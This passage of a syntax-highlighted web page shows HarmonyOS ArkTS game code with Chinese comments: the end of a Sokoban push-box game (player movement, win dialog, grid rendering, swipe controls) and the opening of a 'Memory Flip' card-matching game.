class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 如果新位置是墙，则不能移动</span></span><br><span class="line">    <span class="keyword">if</span> (targetCell.<span class="property">type</span> === <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> crateIndex = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">isCratePositionVisible</span>(newX, newY)) &#123;</span><br><span class="line">      <span class="keyword">const</span> crateBehindCell = <span class="variable language_">this</span>.<span class="property">grid</span>[newX + dx][newY + dy];</span><br><span class="line">      <span class="keyword">if</span> (!crateBehindCell || crateBehindCell.<span class="property">type</span> !== <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      crateIndex = <span class="variable language_">this</span>.<span class="property">cratePositions</span>.<span class="title function_">findIndex</span>(<span class="function"><span class="params">crate</span> =&gt;</span> crate.<span class="property">x</span> === newX &amp;&amp; crate.<span class="property">y</span> === newY);</span><br><span class="line">      <span class="keyword">if</span> (crateIndex === -<span class="number">1</span> || <span class="variable language_">this</span>.<span class="title function_">isCratePositionVisible</span>(newX + dx, newY + dy)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span></span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">duration</span>: <span class="number">150</span>,</span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">          <span class="attr">duration</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (crateIndex !== -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">y</span>].<span class="property">x</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">y</span>].<span class="property">y</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">x</span> += dx;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">y</span> += dy;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span>].<span class="property">x</span> = <span class="number">0</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span>].<span class="property">y</span> = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="title function_">setPosition</span>(newX, newY);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">// 检查是否获胜</span></span><br><span class="line">          <span class="keyword">const</span> isAllCrateOnTarget = <span class="variable language_">this</span>.<span class="property">cratePositions</span>.<span class="title function_">every</span>(<span class="function"><span class="params">crate</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">victoryPositions</span>.<span class="title function_">some</span>(<span class="function"><span class="params">victory</span> =&gt;</span> crate.<span class="property">x</span> === victory.<span class="property">x</span> &amp;&amp; crate.<span class="property">y</span> === victory.<span class="property">y</span>);</span><br><span class="line">          &#125;);</span><br><span class="line"> </span><br><span class="line">          <span class="keyword">if</span> (isAllCrateOnTarget) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;恭喜你，你赢了！&quot;</span>);</span><br><span class="line">            <span class="comment">// 可以在这里添加胜利处理逻辑</span></span><br><span class="line">            promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">              <span class="comment">// 显示对话框</span></span><br><span class="line">              <span class="attr">title</span>: <span class="string">&#x27;游戏胜利！&#x27;</span>, <span class="comment">// 对话框标题</span></span><br><span class="line">              <span class="attr">message</span>: <span class="string">&#x27;恭喜你，用时：&#x27;</span> + ((<span class="title class_">Date</span>.<span class="title function_">now</span>() - <span class="variable language_">this</span>.<span class="property">startTime</span>) / <span class="number">1000</span>).<span class="title function_">toFixed</span>(<span class="number">3</span>) + <span class="string">&#x27;秒&#x27;</span>, <span class="comment">// 对话框消息</span></span><br><span class="line">              <span class="attr">buttons</span>: [&#123; <span class="attr">text</span>: <span class="string">&#x27;重新开始&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> &#125;] <span class="comment">// 对话框按钮</span></span><br><span class="line">            &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 对话框关闭后执行</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>(); <span class="comment">// 重新开始游戏</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span>].<span class="property">x</span> = dy * <span class="variable language_">this</span>.<span class="property">cellWidth</span>;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">playerPosition</span>.<span class="property">y</span>].<span class="property">y</span> = dx * <span class="variable language_">this</span>.<span class="property">cellWidth</span>;</span><br><span class="line">      <span class="keyword">if</span> (crateIndex !== -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">y</span>].<span class="property">x</span> = dy * <span class="variable language_">this</span>.<span class="property">cellWidth</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">grid</span>[<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">x</span>][<span class="variable language_">this</span>.<span class="property">cratePositions</span>[crateIndex].<span class="property">y</span>].<span class="property">y</span> = dx * <span class="variable language_">this</span>.<span class="property">cellWidth</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`dx:<span class="subst">$&#123;dx&#125;</span>,dy:<span class="subst">$&#123;dy&#125;</span>`</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123;</span><br><span class="line">      <span class="comment">//游戏区</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="comment">//非零区加瓷砖</span></span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">grid</span>, <span class="function">(<span class="params">row: [], rowIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">item: Cell, colIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="title class_">Stack</span>() &#123;</span><br><span class="line">                  <span class="title class_">Text</span>()</span><br><span class="line">                    .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">backgroundColor</span>(item.<span class="property">type</span> == <span class="number">0</span> ? <span class="title class_">Color</span>.<span class="property">Transparent</span> :</span><br><span class="line">                      ((rowIndex + colIndex) % <span class="number">2</span> == <span class="number">0</span> ? <span class="string">&quot;#cfb381&quot;</span> : <span class="string">&quot;#e1ca9f&quot;</span>))</span><br><span class="line">                    .<span class="title function_">borderRadius</span>(&#123;</span><br><span class="line">                      <span class="attr">topLeft</span>: item.<span class="property">topLeft</span> &gt; <span class="number">10</span> ? item.<span class="property">topLeft</span> : <span class="number">0</span>,</span><br><span class="line">                      <span class="attr">topRight</span>: item.<span class="property">topRight</span> &gt; <span class="number">10</span> ? item.<span class="property">topRight</span> : <span class="number">0</span>,</span><br><span class="line">                      <span class="attr">bottomLeft</span>: item.<span class="property">bottomLeft</span> &gt; <span class="number">10</span> ? item.<span class="property">bottomLeft</span> : <span class="number">0</span>,</span><br><span class="line">                      <span class="attr">bottomRight</span>: item.<span class="property">bottomRight</span> &gt; <span class="number">10</span> ? item.<span class="property">bottomRight</span> : <span class="number">0</span></span><br><span class="line">                    &#125;)</span><br><span class="line">                  <span class="comment">//如果和是胜利坐标，显示叉号</span></span><br><span class="line">                  <span class="title class_">Stack</span>() &#123;</span><br><span class="line">                    <span class="title class_">Text</span>()</span><br><span class="line">                      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                      .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">8</span>&#125;</span>lpx`</span>)</span><br><span class="line">                      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                    <span class="title class_">Text</span>()</span><br><span class="line">                      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">8</span>&#125;</span>lpx`</span>)</span><br><span class="line">                      .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                      .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                  &#125;.<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">45</span> &#125;)</span><br><span class="line">                  .<span class="title function_">visibility</span>(<span class="variable language_">this</span>.<span class="title function_">isVictoryPositionVisible</span>(rowIndex, colIndex) ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">None</span>)</span><br><span class="line"> </span><br><span class="line">                &#125;</span><br><span class="line">              &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Column</span>() &#123;</span><br><span class="line">          <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">grid</span>, <span class="function">(<span class="params">row: [], rowIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title class_">Row</span>() &#123;</span><br><span class="line">              <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">item: Cell, colIndex: number</span>) =&gt;</span> &#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                <span class="comment">//是否显示箱子</span></span><br><span class="line">                <span class="title class_">Stack</span>() &#123;</span><br><span class="line">                  <span class="title class_">Text</span>()</span><br><span class="line">                    .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">backgroundColor</span>(item.<span class="property">type</span> == <span class="number">1</span> ? <span class="string">&quot;#412c0f&quot;</span> : <span class="title class_">Color</span>.<span class="property">Transparent</span>)</span><br><span class="line">                    .<span class="title function_">borderRadius</span>(&#123;</span><br><span class="line">                      <span class="attr">topLeft</span>: item.<span class="property">topLeft</span>,</span><br><span class="line">                      <span class="attr">topRight</span>: item.<span class="property">topRight</span>,</span><br><span class="line">                      <span class="attr">bottomLeft</span>: item.<span class="property">bottomLeft</span>,</span><br><span class="line">                      <span class="attr">bottomRight</span>: item.<span class="property">bottomRight</span></span><br><span class="line">                    &#125;)</span><br><span class="line">                  <span class="title class_">Text</span>(<span class="string">&#x27;箱&#x27;</span>)</span><br><span class="line">                    .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                    .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">                    .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth - <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth - <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#cb8321&quot;</span>)<span class="comment">//#995d12   #cb8321</span></span><br><span class="line">                    .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">                    .<span class="title function_">visibility</span>(<span class="variable language_">this</span>.<span class="title function_">isCratePositionVisible</span>(rowIndex, colIndex) ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">None</span>)</span><br><span class="line">                  <span class="title class_">Text</span>(<span class="string">&#x27;我&#x27;</span>)</span><br><span class="line">                    .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">                    .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">                    .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth / <span class="number">2</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth - <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth - <span class="number">5</span>&#125;</span>lpx`</span>)</span><br><span class="line">                    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#007dfe&quot;</span>)<span class="comment">//#995d12   #cb8321</span></span><br><span class="line">                    .<span class="title function_">borderRadius</span>(<span class="number">10</span>)</span><br><span class="line">                    .<span class="title function_">visibility</span>(<span class="variable language_">this</span>.<span class="title function_">isPlayerPositionVisible</span>(rowIndex, colIndex) ? <span class="title class_">Visibility</span>.<span class="property">Visible</span> : <span class="title class_">Visibility</span>.<span class="property">None</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>)</span><br><span class="line">                .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: <span class="string">`<span class="subst">$&#123;item.x&#125;</span>lpx`</span>, <span class="attr">y</span>: <span class="string">`<span class="subst">$&#123;item.y&#125;</span>lpx`</span> &#125;)</span><br><span class="line"> </span><br><span class="line">              &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;重新开始&#x27;</span>).<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">MIDDLE</span> &#125;)</span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>();</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#fdb300&quot;</span>)</span><br><span class="line">    .<span class="title function_">padding</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;)</span><br><span class="line">    .<span class="title function_">onTouch</span>(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (e.<span class="property">type</span> === <span class="title class_">TouchType</span>.<span class="property">Down</span> &amp;&amp; e.<span class="property">touches</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// 触摸开始，记录初始位置</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">screenStartX</span> = e.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">x</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">screenStartY</span> = e.<span class="property">touches</span>[<span class="number">0</span>].<span class="property">y</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">type</span> === <span class="title class_">TouchType</span>.<span class="property">Up</span> &amp;&amp; e.<span class="property">changedTouches</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// 当手指抬起时，更新最后的位置</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lastScreenX</span> = e.<span class="property">changedTouches</span>[<span class="number">0</span>].<span class="property">x</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lastScreenY</span> = e.<span class="property">changedTouches</span>[<span class="number">0</span>].<span class="property">y</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">gesture</span>(</span><br><span class="line">      <span class="title class_">SwipeGesture</span>(&#123; <span class="attr">direction</span>: <span class="title class_">SwipeDirection</span>.<span class="property">All</span> &#125;)<span class="comment">// 支持方向中 all可以是上下左右</span></span><br><span class="line">        .<span class="title function_">onAction</span>(<span class="function">(<span class="params">_event: GestureEvent</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> swipeX = <span class="variable language_">this</span>.<span class="property">lastScreenX</span> - <span class="variable language_">this</span>.<span class="property">screenStartX</span>;</span><br><span class="line">          <span class="keyword">const</span> swipeY = <span class="variable language_">this</span>.<span class="property">lastScreenY</span> - <span class="variable language_">this</span>.<span class="property">screenStartY</span>;</span><br><span class="line">          <span class="comment">// 清除开始位置记录，准备下一次滑动判断</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">screenStartX</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">screenStartY</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(swipeX) &gt; <span class="title class_">Math</span>.<span class="title function_">abs</span>(swipeY)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (swipeX &gt; <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="comment">// 向右滑动</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">movePlayer</span>(<span class="string">&#x27;right&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// 向左滑动</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">movePlayer</span>(<span class="string">&#x27;left&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (swipeY &gt; <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="comment">// 向下滑动</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">movePlayer</span>(<span class="string">&#x27;down&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// 向上滑动</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">movePlayer</span>(<span class="string">&#x27;up&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Memory-Flip"><a href="#Memory-Flip" class="headerlink" title="Memory Flip"></a>Memory Flip</h1><p>记忆翻转</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span> <span class="comment">// 导入用于显示对话框的模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用装饰器来观察数据变化</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GameCell</span> &#123; <span class="comment">// 定义单元格类</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">value</span>: string; <span class="comment">// 单元格的值，即卡片上的图案</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">isVisible</span>: boolean = <span class="literal">false</span>; <span class="comment">// 控制卡片是否可见</span></span><br><span class="line">  <span class="attr">isFrontVisible</span>: boolean = <span class="literal">false</span>; <span class="comment">// 控制卡片是否正面朝上</span></span><br><span class="line">  <span class="attr">isMatched</span>: boolean = <span class="literal">false</span>; <span class="comment">// 标记卡片是否已被匹配</span></span><br><span class="line">  <span class="attr">isAnimationRunning</span>: boolean = <span class="literal">false</span>; <span class="comment">// 动画是否正在运行</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">rotationAngle</span>: number = <span class="number">0</span>; <span class="comment">// 卡片的旋转角度</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">value: string</span>) &#123; <span class="comment">// 构造函数，初始化单元格</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">value</span> = value; <span class="comment">// 设置单元格的值</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 展示卡片正面的方法</span></span><br><span class="line">  <span class="title function_">revealFace</span>(<span class="params">animationTime: number, callback?: () =&gt; <span class="keyword">void</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123; <span class="comment">// 如果已经有动画在运行，则返回</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span>; <span class="comment">// 设置动画状态为运行中</span></span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123; <span class="comment">// 开始动画</span></span><br><span class="line">      <span class="attr">duration</span>: 